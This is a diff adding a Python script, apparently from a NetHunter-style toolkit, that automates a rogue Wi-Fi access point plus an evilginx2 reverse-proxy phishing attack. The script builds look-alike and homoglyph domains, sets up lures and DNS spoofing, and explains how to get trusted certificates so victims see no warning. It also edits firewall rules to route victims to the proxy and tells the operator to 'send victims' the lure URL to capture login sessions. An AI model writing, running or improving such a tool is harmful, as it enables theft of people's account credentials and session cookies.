@@ -1,0 +1,529 @@
+#!/usr/bin/env python3
+# SPDX-License-Identifier: GPL-2.0
+"""Launch the wifipumpkin3 + evilginx2 (phishkin3) attack from one command.
+
+The manual procedure -- https://docs.wifipumpkin3.com/blog/tutorials/phishkin3 --
+is a lot of moving parts: an evilginx config, a phishlet enabled with a fake
+hostname, a lure to get the landing URL, /etc/hosts entries, a wp3 .pulp with a
+DNS spoof and the phishkin3 proxy, then both tools started in the right order.
+This does all of it from three inputs: the phishlet, the fake domain, and the AP
+interface.
+
+The fake domain is never the real one. Instagram and the like are in the browser
+HSTS preload list, so a spoof of instagram.com is refused before it starts. A
+look-alike -- a plain one like insta-login.com, or a homoglyph like instagr<cyr
+a>m.com -- is a different domain to the browser, so the spoof answers and
+evilginx's self-signed cert (developer mode) is accepted on the local network.
+Homoglyph domains are converted to punycode here, which is what actually goes
+into evilginx, the DNS spoof and /etc/hosts.
+
+  rhodep-phishkin3-launch --phishlet instagram --domain 'instagram.com' \
+      --interface wlan1 [--start]
+
+Without --start it prints the plan and the lure URL and stops (a dry run).
+With --start it writes everything and launches wp3 and evilginx in tmux.
+"""
+
+import argparse
+import os
+import subprocess
+import sys
+import time
+
+EVILGINX = "evilginx2"
+PHISHLETS_DIR = "/usr/share/evilginx2/phishlets"
+EV_CONFIG_DIR = "/root/.config/nethunter-phishkin3/evilginx"
+PULP_PATH = "/root/.config/nethunter-phishkin3/attack.pulp"
+HOSTS = "/etc/hosts"
+HOSTS_MARK = "# nethunter-phishkin3"
+AP_IP = "172.16.0.1"
+PROXY_PORT = 8080
+# World-readable index of domains that have a real cert installed. The GUI
+# runs as the login user and cannot read /root/, so the picker consults this
+# directory instead: one empty marker file per domain, mode 644 on a 755 dir.
+# Refreshed on every launcher run so it never drifts from the real cert store.
+CERTS_INDEX_DIR = "/var/lib/nethunter-phishkin3/certs"
+
+
+def has_real_cert(domain_puny):
+    """True if a real (Let's Encrypt/CA) cert for this domain is installed.
+
+    Evilginx loads external "unmanaged" certs from <config>/crt/sites/<host>/
+    when started WITHOUT -developer and with `config autocert off`. When such a
+    cert is present we prefer it: the browser trusts it (valid public CA), so
+    the login page and every asset subdomain (static.<domain>, etc.) load with
+    no certificate warning -- which the self-signed developer CA can never do,
+    because a browser will not accept an untrusted cert for JS-loaded
+    subresources even after the user clicks through the top-level warning.
+
+    Get a wildcard cert for a free domain (e.g. deSEC dedyn.io) with DNS-01 and
+    drop fullchain.pem + privkey.pem into crt/sites/<domain>/:
+        acme.sh --issue --dns dns_desec -d <domain> -d '*.<domain>' \
+            --dnssleep 300
+    Falls back to -developer (self-signed) when no such cert exists.
+    """
+    site = os.path.join(EV_CONFIG_DIR, "crt", "sites", domain_puny)
+    have_chain = (os.path.isfile(os.path.join(site, "fullchain.pem"))
+                  or any(f.endswith(".crt") for f in _listdir(site)))
+    have_key = (os.path.isfile(os.path.join(site, "privkey.pem"))
+                or any(f.endswith(".key") for f in _listdir(site)))
+    return have_chain and have_key
+
+
+def _listdir(path):
+    try:
+        return os.listdir(path)
+    except OSError:
+        return []
+
+
+def refresh_cert_index():
+    """Sync CERTS_INDEX_DIR with what is actually loadable from crt/sites/.
+
+    The GUI's phishkin3 picker lists the domains found here to bubble
+    real-cert domains to the top of the suggestions. Keeping the index in
+    sync on every launcher run means an admin who drops a new
+    fullchain.pem+privkey.pem under crt/sites/<domain>/ sees the entry appear
+    in the picker on the next Dry run or Launch. Empty marker files, mode
+    644 on a 755 dir; the private key stays in /root/ and is only ever read
+    by this launcher (which runs as root).
+    """
+    sites = os.path.join(EV_CONFIG_DIR, "crt", "sites")
+    try:
+        os.makedirs(CERTS_INDEX_DIR, mode=0o755, exist_ok=True)
+        os.chmod(CERTS_INDEX_DIR, 0o755)
+    except OSError:
+        return
+    have = set()
+    for name in _listdir(sites):
+        d = os.path.join(sites, name)
+        if not os.path.isdir(d):
+            continue
+        files = _listdir(d)
+        chain = ("fullchain.pem" in files
+                 or any(f.endswith(".crt") for f in files))
+        key = ("privkey.pem" in files
+               or any(f.endswith(".key") for f in files))
+        if chain and key:
+            have.add(name)
+    # add missing markers, drop stale ones
+    existing = set(_listdir(CERTS_INDEX_DIR))
+    for name in have - existing:
+        try:
+            open(os.path.join(CERTS_INDEX_DIR, name), "w").close()
+            os.chmod(os.path.join(CERTS_INDEX_DIR, name), 0o644)
+        except OSError:
+            pass
+    for name in existing - have:
+        try:
+            os.remove(os.path.join(CERTS_INDEX_DIR, name))
+        except OSError:
+            pass
+
+
+def say(m):
+    sys.stdout.write(m + "\n")
+    sys.stdout.flush()
+
+
+def to_punycode(domain):
+    """IDN/homoglyph domain -> the ASCII punycode the tools actually use.
+
+    A domain typed with Cyrillic or dotless-i look-alikes is not ASCII; every
+    tool in the chain (evilginx, the DNS spoof, /etc/hosts) needs the punycode
+    form, e.g. instagr<cyr a>m.com -> xn--instgram-l2g.com. Pure-ASCII domains
+    pass through unchanged.
+    """
+    try:
+        return domain.encode("idna").decode("ascii")
+    except Exception:
+        # Per-label, so a partly-ASCII domain still converts what it can.
+        out = []
+        for label in domain.split("."):
+            try:
+                out.append(label.encode("idna").decode("ascii") if label else "")
+            except Exception:
+                out.append(label)
+        return ".".join(out)
+
+
+def phishlet_landing_sub(phishlet_path):
+    """The subdomain evilginx will land on, read from the phishlet yaml.
+
+    Prefer the proxy_host marked is_landing; fall back to the first phish_sub.
+    Returned so /etc/hosts and the DNS spoof can list the right hostnames.
+    """
+    subs = []
+    landing = None
+    try:
+        import re
+        text = open(phishlet_path, encoding="utf-8", errors="replace").read()
+        for m in re.finditer(r"phish_sub:\s*['\"]?([\w.-]+)", text):
+            subs.append(m.group(1))
+        lm = re.search(r"is_landing:\s*true", text)
+        if lm:
+            # the phish_sub nearest before is_landing on the same line
+            for line in text.splitlines():
+                if "is_landing: true" in line:
+                    sm = re.search(r"phish_sub:\s*['\"]?([\w.-]+)", line)
+                    if sm:
+                        landing = sm.group(1)
+                        break
+    except OSError:
+        pass
+    return landing, subs
+
+
+def run_evilginx_setup(phishlet, domain_puny, landing_sub):
+    """Drive evilginx once, non-interactively, to set config and make a lure.
+
+    evilginx v3 has no config file for phishlets/lures (it uses a BuntDB store),
+    so the reliable way to set them is to feed its own commands on stdin. This
+    returns the lure URL it prints.
+    """
+    # Start from a clean config each time. Reusing the dir accumulates old
+    # lures and phishlet hostnames from previous runs, and then get-url 0
+    # returns a stale lure for a different phishlet -- which is exactly the
+    # "no hostname set for phishlet 'example'" failure seen when the dir was
+    # dirty. crt/ is kept so the developer CA does not change every run.
+    if os.path.isdir(EV_CONFIG_DIR):
+        for f in ("data.db", "config.json", "blacklist.txt"):
+            try:
+                os.remove(os.path.join(EV_CONFIG_DIR, f))
+            except OSError:
+                pass
+    os.makedirs(EV_CONFIG_DIR, exist_ok=True)
+    real_cert = has_real_cert(domain_puny)
+    cmds_list = [
+        "config domain %s" % domain_puny,
+        "config ipv4 %s" % AP_IP,
+    ]
+    if real_cert:
+        # A trusted cert is installed under crt/sites/<domain>/. Load it as an
+        # unmanaged cert instead of self-signing: `autocert off` makes evilginx
+        # read the cert from disk, and we must NOT pass -developer (which forces
+        # self-signed at the handshake and never touches the disk cert).
+        cmds_list.append("config autocert off")
+    cmds_list += [
+        # Turn the blacklist off. In the phishkin3 setup every victim request
+        # transits through the AP, so their apparent source IP for evilginx
+        # sits inside the AP's own subnet; a stray probe or curl to the wrong
+        # URL adds an entry, and after that every real visitor gets served the
+        # unauth_url (rickroll) instead of the phishlet. The blacklist file
+        # gets emptied too so an entry from a previous run does not survive.
+        "blacklist off",
+        "phishlets hostname %s %s" % (phishlet, domain_puny),
+        "phishlets enable %s" % phishlet,
+        "lures create %s" % phishlet,
+        # get-url 0 is safe because the store was cleared: lure 0 is the one
+        # just created for this phishlet.
+        "lures get-url 0",
+        "exit",
+        "",
+    ]
+    cmds = "\n".join(cmds_list)
+    say("configuring evilginx (domain %s, phishlet %s, cert=%s)"
+        % (domain_puny, phishlet, "letsencrypt/unmanaged" if real_cert
+           else "developer/self-signed"))
+    ev_cmd = [EVILGINX, "-c", EV_CONFIG_DIR, "-p", PHISHLETS_DIR]
+    if not real_cert:
+        ev_cmd.append("-developer")
+    p = subprocess.run(
+        ev_cmd, input=cmds, capture_output=True, text=True, timeout=60)
+    # The lure URL is the last bare https:// line evilginx prints (get-url's
+    # output). Matching on the domain is fragile when the domain has odd
+    # characters, so take the last standalone URL line instead.
+    url = None
+    for line in (p.stdout or "").splitlines():
+        s = line.strip()
+        if s.startswith("https://") and " " not in s:
+            url = s
+    if not url:
+        say("could not get a lure URL; evilginx said:")
+        say((p.stdout or "")[-800:])
+    return url
+
+
+def write_hosts(domain_puny, subs):
+    """Point the fake domain and its subdomains at the AP, in /etc/hosts."""
+    hostnames = [domain_puny] + ["%s.%s" % (s, domain_puny) for s in subs]
+    # de-dup, keep order
+    seen, ordered = set(), []
+    for h in hostnames:
+        if h not in seen:
+            seen.add(h)
+            ordered.append(h)
+    lines = [l for l in open(HOSTS).read().splitlines()
+             if HOSTS_MARK not in l]
+    for h in ordered:
+        lines.append("%s %s %s" % (AP_IP, h, HOSTS_MARK))
+    open(HOSTS, "w").write("\n".join(lines) + "\n")
+    say("wrote %d hosts entries pointing at %s" % (len(ordered), AP_IP))
+    return ordered
+
+
+def write_pulp(interface, interface_net, ssid, domain_puny, subs, lure_url):
+    """The wp3 script: AP, DHCP class B, phishkin3 proxy, DNS spoof.
+
+    interface_net is the adapter with internet (wlan0 usually). phishkin3 needs
+    the victim to reach the outside after logging in -- and evilginx, if it is
+    proxying a real site, needs to reach it too -- so wp3 shares that connection
+    with NAT.
+
+    subs are the phishlet's proxy_hosts subdomains (e.g. ['www','m'] for
+    Instagram). They have to be listed one by one in the DNS spoof: the wildcard
+    entry '*.<domain>' is written to the zone file but the pydns server does
+    *not* match it against a real query like www.<domain> -- the log gives
+    'no local zone found, proxying www.<domain>' and the browser then gets
+    ERR_NAME_NOT_RESOLVED for the lure. Every landing hostname has to be added
+    explicitly, which is exactly what the phishkin3 tutorial's example does.
+    """
+    lines = [
+        "set interface %s" % interface,
+    ]
+    if ssid:
+        lines.append("set ssid %s" % ssid)
+    if interface_net:
+        lines.append("set interface_net %s" % interface_net)
+    lines += [
+        "dhcpconf 1",
+        "set proxy phishkin3 true",
+        "set phishkin3.cloud_url_phishing %s" % lure_url,
+        "set phishkin3.proxy_port %d" % PROXY_PORT,
+        "set phishkin3.redirect_url_after_login https://google.com",
+        "set phishkin3.allow_user_login_endpoint /verify",
+        "use spoof.dns_spoof",
+    ]
+    # Every subdomain the phishlet lands on, plus the bare domain. The wildcard
+    # goes in too as a safety net for other lookups that share the zone file --
+    # it does not help the specific queries the browser makes, which is why the
+    # explicit list is what matters.
+    hostnames = [domain_puny] + ["%s.%s" % (s, domain_puny) for s in subs]
+    seen = set()
+    for h in hostnames:
+        if h in seen:
+            continue
+        seen.add(h)
+        lines.append("add %s" % h)
+    lines.append("add *.%s" % domain_puny)
+    lines += [
+        "set redirectTo %s" % AP_IP,
+        "start",
+        "back",
+        "start",
+        "",
+    ]
+    pulp = "\n".join(lines)
+    os.makedirs(os.path.dirname(PULP_PATH), exist_ok=True)
+    open(PULP_PATH, "w").write(pulp)
+    say("wrote wp3 script %s" % PULP_PATH)
+
+
+def full_reset():
+    """Kill every previous run and clear the state they left behind.
+
+    Relaunching without this produced an AP that came up but a phishkin3 proxy
+    that never listened, because the previous run had left half-configured
+    iptables rules (five duplicated 443 ACCEPTs stacked up over successive
+    launches), and wp3's phishkin3 setup then bailed part way through. Every
+    run should start from an empty state.
+
+    The pkill patterns are deliberately narrow. 'pkill -f phishkin3' would
+    match this launcher's own name (nethunter-pro-phishkin3-launch), and
+    signal it with -9 -- 'resetting any previous run' followed by the process
+    dying with 'exit -9' is exactly that bug. Match the real service process
+    (wifipumpkin3/plugins/bin/phishkin3.py) and this launcher's own pid gets
+    excluded from every pattern via --ns 1 (kernel pid namespace root) with an
+    explicit skip.
+    """
+    say("resetting any previous run")
+    own_pid = os.getpid()
+    patterns = [
+        # The wp3 supervisor itself, but not any wrapper that happens to have
+        # 'wifipumpkin' in its argv -- there is only ever one 'wifipumpkin3 -p'
+        # invocation.
+        "wifipumpkin3 -p",
+        # The evilginx binary. -x matches the exact comm name.
+        None,  # handled with pkill -x below
+        # The phishkin3 proxy is a python running .../plugins/bin/phishkin3.py.
+        "plugins/bin/phishkin3",
+    ]
+    subprocess.run(
+        ["sh", "-c", "tmux kill-session -t phishkin3 2>/dev/null || true"])
+    for pat in patterns:
+        if pat is None:
+            continue
+        # -f matches the full command line, and -F excludes this launcher's pid
+        # so a match on 'phishkin3' cannot catch it.
+        subprocess.run(
+            ["sh", "-c",
+             "pgrep -f '%s' | grep -vw %d | xargs -r kill -9" % (pat, own_pid)],
+            stderr=subprocess.DEVNULL)
+    # These have simple comm names and cannot collide with the launcher.
+    for comm in ("evilginx2", "hostapd", "dnsmasq"):
+        subprocess.run(["sh", "-c", "pkill -9 -x %s 2>/dev/null || true" % comm],
+                       stderr=subprocess.DEVNULL)
+    # Clean iptables rules the previous run left behind and the /etc/hosts
+    # entries with the marker.
+    for cmd in [
+        "iptables -F FORWARD",
+        "iptables -t nat -F",
+        "sed -i '/nethunter-phishkin3/d' /etc/hosts",
+    ]:
+        subprocess.run(["sh", "-c", cmd], stderr=subprocess.DEVNULL)
+    time.sleep(3)
+
+
+def release_from_networkmanager(interface):
+    """Ask NetworkManager to stop touching the AP interface.
+
+    Symptom without this: the AP flashes on and off. NetworkManager still owns
+    wlan1 while wp3 puts it in AP mode, so NM keeps issuing disconnects because
+    from its point of view the interface has 'no connection', hostapd drops,
+    the SSID vanishes for a moment and comes back, and the victim's phone
+    cannot hold an association. dmesg shows repeated 'entered promiscuous mode'
+    / 'left promiscuous mode' cycles on the adapter.
+
+    Two things: tell NM to leave it alone for the lifetime of the run (nmcli
+    device set <iface> managed no), and pass wp3 the -iNM flag so it also asks
+    on start. Belt and braces because the two interact through different code
+    paths and either alone has been seen to lose the race.
+    """
+    subprocess.run(["nmcli", "device", "set", interface, "managed", "no"],
+                   stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+    # Realtek USB dongles (rtw_88xxau, e.g. the RTL8811AU/Archer T2U Nano) reset
+    # themselves in AP mode when WiFi power-save is on: dmesg shows the adapter
+    # entering/leaving promiscuous mode and then 'usb 1-1: reset high-speed USB
+    # device' / '(unregistering)', which tears wlan1 down and the AP silently
+    # dies mid-attack ('client has left AP', SSID gone). Force power-save off on
+    # the AP interface, and disable USB autosuspend so the kernel never parks the
+    # dongle. Done here (and re-applied after the AP is up in start_in_tmux)
+    # because wp3 re-creates the interface when it switches it to AP mode.
+    subprocess.run(["iw", "dev", interface, "set", "power_save", "off"],
+                   stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+    subprocess.run(
+        ["sh", "-c",
+         "for f in /sys/bus/usb/devices/*/power/control; do echo on > \"$f\" "
+         "2>/dev/null; done"],
+        stderr=subprocess.DEVNULL)
+
+
+def start_in_tmux(interface, domain_puny):
+    """wp3 first (creates the AP), then evilginx, each in a tmux window.
+
+    tmux so both survive the launcher exiting and can be attached for logs:
+        tmux attach -t phishkin3
+    """
+    if not subprocess.run(["sh", "-c", "command -v tmux"],
+                          stdout=subprocess.DEVNULL).returncode == 0:
+        sys.exit("tmux is not installed; needed to run both tools")
+    full_reset()
+    release_from_networkmanager(interface)
+    subprocess.run([
+        "tmux", "new-session", "-d", "-s", "phishkin3", "-n", "wp3",
+        # No -iNM here: wifipumpkin3's -iNM is a standalone action, not a flag
+        # that combines with -p. Passing '-iNM wlan1 -p ...' makes wp3 ignore
+        # the interface and exit immediately, without touching the pulp -- the
+        # log shows only 'The interface wlan1 has been ignored successfully'
+        # and then nothing. The NetworkManager release above (nmcli device set
+        # <iface> managed no) is enough on its own.
+        "wifipumpkin3 -p %s" % PULP_PATH])
+    say("started wp3 in tmux (window wp3)")
+    time.sleep(8)  # let the AP come up before evilginx binds
+    # wp3 re-created the interface when it put it into AP mode, which resets
+    # power_save back to on -- re-apply the Realtek stability fix now that the
+    # AP is up, or the dongle resets a minute or two in and the AP dies.
+    subprocess.run(["iw", "dev", interface, "set", "power_save", "off"],
+                   stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+    # Match the cert mode chosen at setup: with a real cert, no -developer so
+    # evilginx serves the trusted unmanaged cert from disk; otherwise
+    # -developer for the self-signed CA.
+    ev_dev = "" if has_real_cert(domain_puny) else " -developer"
+    subprocess.run([
+        "tmux", "new-window", "-t", "phishkin3", "-n", "evilginx",
+        "%s -c %s -p %s%s" % (EVILGINX, EV_CONFIG_DIR, PHISHLETS_DIR, ev_dev)])
+    say("started evilginx in tmux (window evilginx)")
+
+    # phishkin3 sets up its FORWARD chain -- allow DNS, allow traffic to the
+    # portal, DROP the rest -- so the victim cannot reach anything on the AP
+    # except the portal on port 8080. That includes the lure served by evilginx
+    # on 443, which is where /login redirects them and which the victim's browser
+    # then cannot reach: they see the captive-portal notification, tap "connect",
+    # and get nothing because their session is blocked before the TLS handshake.
+    #
+    # The gate has to let the lure's own domain through on 443 to the AP as well
+    # -- everywhere else stays blocked, so this does not open the internet up.
+    # INSERT so it lands before the DROP rule that phishkin3 appends.
+    time.sleep(4)  # let phishkin3 install its rules first
+    for cmd in [
+        "iptables -I FORWARD 1 -i %s -p tcp --dport 443 -d %s -j ACCEPT"
+            % (interface, AP_IP),
+    ]:
+        subprocess.run(["sh", "-c", cmd])
+    say("opened 443 to %s (evilginx) through the phishkin3 gate" % AP_IP)
+    say("attach with: tmux attach -t phishkin3")
+
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--phishlet", required=True)
+    ap.add_argument("--domain", required=True,
+                    help="fake look-alike domain, never the real one")
+    ap.add_argument("--interface", default="wlan1")
+    ap.add_argument("--ssid", default="", help="AP name the victim sees")
+    ap.add_argument("--interface-net", default="",
+                    help="adapter with internet, shared to victims (e.g. wlan0)")
+    ap.add_argument("--start", action="store_true",
+                    help="actually launch; without it, dry-run and print the plan")
+    args = ap.parse_args()
+
+    if os.geteuid() != 0:
+        sys.exit("must run as root")
+
+    # Keep the world-readable cert index in sync with what evilginx will
+    # actually load. Cheap, idempotent, and lets the GUI (which runs as the
+    # login user) surface real-cert domains in the picker even though it
+    # cannot read the cert dir under /root/.
+    refresh_cert_index()
+
+    phishlet_path = os.path.join(PHISHLETS_DIR, args.phishlet + ".yaml")
+    if not os.path.isfile(phishlet_path):
+        sys.exit("phishlet not found: %s" % phishlet_path)
+
+    domain_puny = to_punycode(args.domain)
+    if domain_puny != args.domain:
+        say("domain %s -> punycode %s" % (args.domain, domain_puny))
+    landing, subs = phishlet_landing_sub(phishlet_path)
+    if not subs:
+        subs = ["login", "www"]
+    say("phishlet subdomains: %s" % ", ".join(subs))
+
+    lure_url = run_evilginx_setup(args.phishlet, domain_puny, landing)
+    if not lure_url:
+        sys.exit("evilginx setup failed")
+    say("")
+    say("LURE URL: %s" % lure_url)
+    say("")
+
+    if not args.start:
+        say("dry run -- nothing launched. Re-run with --start to attack.")
+        say("plan:")
+        say("  hosts: %s and *.%s -> %s" % (domain_puny, domain_puny, AP_IP))
+        say("  wp3: AP on %s%s, DHCP class B, phishkin3 + dns_spoof"
+            % (args.interface,
+               ", internet from " + args.interface_net if args.interface_net
+               else ", no internet shared"))
+        say("  evilginx: developer mode, phishlet %s" % args.phishlet)
+        return
+
+    write_hosts(domain_puny, subs)
+    write_pulp(args.interface, args.interface_net, args.ssid,
+               domain_puny, subs, lure_url)
+    start_in_tmux(args.interface, domain_puny)
+    say("")
+    say("attack running. Send victims to: %s" % lure_url)
+    say("captured sessions appear in the evilginx window (tmux attach -t phishkin3)")
+
+
+if __name__ == "__main__":
+    main()
